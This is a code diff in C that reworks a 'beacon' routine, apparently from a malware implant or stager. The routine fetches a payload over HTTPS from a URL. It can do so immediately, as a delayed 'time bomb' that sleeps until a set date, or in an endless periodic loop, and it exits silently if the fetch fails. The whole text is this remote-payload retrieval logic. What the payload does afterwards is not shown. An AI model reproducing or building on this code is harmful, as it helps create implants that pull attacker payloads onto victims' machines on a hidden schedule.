@@ -71,11 +71,24 @@ struct MemoryStruct getHTTPS(char *URL)
     return payload;
 }
 
-struct MemoryStruct beacon(char *URL)
+struct MemoryStruct beacon(char *URL, char initial)
 {
     struct MemoryStruct payload;
+    size_t beaconMode;
+    size_t beaconDateTime;
 
-    if (BEACON_MODE == 0) // beacon instantly once
+    if (initial == 1)
+    {
+        beaconMode = BEACON_MODE_INITIAL;
+        beaconDateTime = BEACON_DATE_TIME_INITIAL;
+    }
+    else
+    {
+        beaconMode = BEACON_MODE;
+        beaconDateTime = BEACON_DATE_TIME;
+    }
+
+    if (beaconMode == 0) // beacon instantly once
     {
         payload = getHTTPS(URL);
         if (payload.memory == NULL)
@@ -83,11 +96,11 @@ struct MemoryStruct beacon(char *URL)
             exit(0); // if file not obtained and set to only beacon once, exit immediately
         }
     }
-    else if (BEACON_MODE == -1) // time bomb beacon
+    else if (beaconMode == -1) // time bomb beacon
     {
-        if (BEACON_DATE_TIME > time(NULL)) // beacon date/time not reached yet, sleep
+        if (beaconDateTime > time(NULL)) // beacon date/time not reached yet, sleep
         {
-            sleep(BEACON_DATE_TIME - time(NULL));
+            sleep(beaconDateTime - time(NULL));
         }
         
         payload = getHTTPS(URL);
@@ -100,7 +113,7 @@ struct MemoryStruct beacon(char *URL)
     { 
         while (1)
         {
-            sleep(BEACON_MODE);
+            sleep(beaconMode);
             payload = getHTTPS(URL);
             if (payload.memory == NULL)
             { // continue beaconing if no file returned
